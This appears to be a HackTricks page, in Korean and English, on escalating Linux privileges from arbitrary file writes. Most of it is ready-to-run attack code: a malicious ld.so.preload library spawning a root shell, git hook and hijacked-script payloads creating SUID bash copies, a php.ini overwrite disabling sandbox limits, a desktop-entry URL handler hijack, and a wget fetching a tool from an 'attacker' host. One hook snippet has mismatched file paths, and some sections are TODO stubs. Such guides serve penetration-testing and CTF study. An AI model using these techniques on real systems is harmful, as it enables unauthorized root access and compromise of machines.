# 루트에 임의 파일 쓰기

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

이 파일은 **`LD_PRELOAD`** 환경 변수처럼 동작하지만 **SUID binaries**에서도 작동합니다.\
만약 이 파일을 생성하거나 수정할 수 있다면, 실행되는 각 바이너리와 함께 로드될 라이브러리의 **경로를 추가**하면 됩니다.

예: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)는 **스크립트**로, git 리포지토리에서 commit이 생성되거나 merge 같은 다양한 **이벤트**에서 **실행**됩니다. 따라서 **권한 있는 스크립트 또는 사용자**가 이러한 작업을 자주 수행하고 **`.git` 폴더에 쓸 수 있다면**, 이것을 이용해 **privesc**할 수 있습니다.

For example, It's possible to **스크립트를 생성** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

일부 커스텀 데몬은 사용자 제공 PHP를 `php`를 제한된 **`php.ini`**와 함께 실행해 검증합니다(예: `disable_functions=exec,system,...`). 샌드박스된 코드가 여전히 **어떤 쓰기 primitive**(예: `file_put_contents`)를 가지고 있고 데몬이 사용하는 **정확한 `php.ini` 경로**에 접근할 수 있다면, 해당 설정을 **덮어써 제한을 해제**한 뒤 권한이 상승된 상태로 실행되는 두 번째 페이로드를 제출할 수 있습니다.

Typical flow:

1. First payload overwrites the sandbox config.
2. Second payload executes code now that dangerous functions are re-enabled.

Minimal example (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

쓰기 권한이 있는 공격자는 피해자의 설정 디렉터리에 있는 파일을 쉽게 교체하거나 생성해 시스템 동작을 변경하고 의도치 않은 코드 실행을 유발할 수 있습니다. `$HOME/.config/mimeapps.list` 파일을 수정해 HTTP 및 HTTPS URL 핸들러를 악성 파일로 가리키도록 하면(예: `x-scheme-handler/http=evil.desktop`로 설정), 공격자는 **http 또는 https 링크를 클릭하면 해당 `evil.desktop` 파일에 지정된 코드가 실행되도록** 보장할 수 있습니다. 예를 들어 `$HOME/.local/share/applications`에 `evil.desktop`에 다음과 같은 악성 코드를 두면 외부 URL을 클릭할 때 포함된 명령이 실행됩니다:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root가 실행하는 user-writable scripts/binaries

특권 워크플로우가 `/bin/sh /home/username/.../script` (또는 비특권 사용자가 소유한 디렉터리 안에 있는 어떤 바이너리) 같은 것을 실행한다면, 이를 가로챌 수 있습니다:

- **실행 감지:** 프로세스를 [pspy](https://github.com/DominicBreuker/pspy)로 모니터링하여 root가 사용자 제어 경로를 호출하는 것을 포착하세요:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** 대상 파일과 해당 디렉터리가 사용자 계정으로 소유되었거나 쓰기 가능한지 확인하세요.
- **Hijack the target:** 원본 binary/script를 백업하고 payload를 떨어뜨려 SUID shell (or any other root action)을 생성한 다음 권한을 복원하세요:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **권한 있는 동작을 트리거하세요** (예: 헬퍼를 생성하는 UI 버튼을 누름). root가 가로채진 경로를 다시 실행하면, 권한 상승된 shell을 `./rootshell -p`로 획득하세요.

## 참고자료

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
